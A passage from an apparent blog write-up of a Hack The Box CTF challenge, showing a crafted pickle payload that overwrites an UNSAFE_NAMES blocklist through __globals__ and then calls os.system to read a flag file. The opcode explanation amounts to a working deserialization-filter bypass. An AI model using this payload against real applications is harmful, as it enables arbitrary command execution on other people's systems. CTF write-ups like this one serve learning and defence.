+<pre class="language-python" tabindex="0"><code class="language-python">UNSAFE_NAMES <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'random'</span><span class="token punctuation">]</span></code></pre>
+<p>There are plenty of ways to bypass this. I chose to overwrite the <code>UNSAFE_NAMES</code> list.</p>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token string">b'capp\npickle.__globals__.__setitem__\n'</span>
+<span class="token operator">+</span>   <span class="token string">b'VUNSAFE_NAMES\n'</span>
+<span class="token operator">+</span>   <span class="token string">b'V\n'</span>
+<span class="token operator">+</span> <span class="token string">b'\x86R'</span>
+<span class="token operator">+</span> <span class="token string">b'0'</span>
+<span class="token operator">+</span> original</code></pre>
+<p>where <code>V</code> as before is a newline-terminated string. Rather than creating an empty list, I just set it to a string which is also iterable so <code>for name_ in UNSAFE_NAMES</code> still works. We need <code>0</code> to pop the result off the stack before running the original pickle code, and use <code>\x86</code> to create a tuple instead of <code>\x85</code> as we have two arguments to the function.</p>
+<p>This acts as:</p>
+<pre class="language-python" tabindex="0"><code class="language-python">app<span class="token punctuation">.</span>pickle<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__setitem__<span class="token punctuation">(</span><span class="token string">"UNSAFE_NAMES"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>random<span class="token punctuation">.</span>_os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"cat flag.txt"</span><span class="token punctuation">)</span></code></pre>
+
+<ul class="links-nextprev"><li>Previous: <a href="/cheeky-bucket-squatting-defeated-by-terraform/">Cheeky Bucket Squatting Defeated by Terraform</a></li>
+</ul>
+
+		</main>
+
+		<footer></footer>
+
+		<!-- Current page: /htb-cyber-apocalypse-ctf-2024-writeup/ -->
+	</body>
+</html>
